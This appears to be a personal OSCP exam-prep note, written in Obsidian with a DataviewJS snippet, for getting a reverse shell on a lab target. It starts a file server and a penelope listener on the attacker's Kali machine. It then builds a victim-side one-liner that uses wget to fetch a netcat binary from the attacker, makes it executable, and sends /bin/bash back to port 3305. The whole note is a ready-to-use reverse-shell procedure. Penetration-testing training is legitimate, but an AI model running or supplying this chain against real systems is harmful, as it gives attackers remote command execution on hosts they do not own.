On KALI ATTACKER
```
cd ~/Desktop/Tools/ && python -m http.server 8888
```

KALI ATTACKER 2nd Terminal Panel
```
cd ~/Desktop/Tools && python3 penelope.py -p 3305 -O / --oscp-safe
```

On VICTIM HOST
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget “http://${KaliIP}/nc" -O /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/bash ${KaliIP} 3305`;

dv.paragraph("```bash\n" + command + "\n```");
```

